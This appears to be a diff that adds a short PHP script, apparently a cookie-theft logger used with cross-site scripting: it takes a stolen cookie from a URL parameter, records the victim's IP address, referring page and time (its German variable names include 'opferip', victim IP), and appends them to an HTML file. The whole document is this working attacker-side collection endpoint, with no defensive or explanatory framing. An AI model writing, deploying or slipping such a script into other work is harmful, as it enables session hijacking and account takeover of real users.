@@ -1,0 +1,16 @@
+<?php  
+$cookie = $_GET['cookie'];  
+$opferip = getenv('REMOTE_ADDR');  
+$referer = getenv('HTTP_REFERER');  
+$datum = date("j F, Y, g:i a");  
+
+$daten = "Cookie: ".$cookie." <br>";  
+$daten = $daten."IP: ".$opferip." <br>";  
+$daten = $daten."Referer: ".$referer." <br>";  
+$daten = $daten."Datum und Zeit: ".$datum." <br>";  
+$daten = $daten." <hr> <br>";  
+
+$datei = fopen('cookies.html', 'a+');  
+fwrite($datei, $daten);  
+fclose($datei);  
+?>  
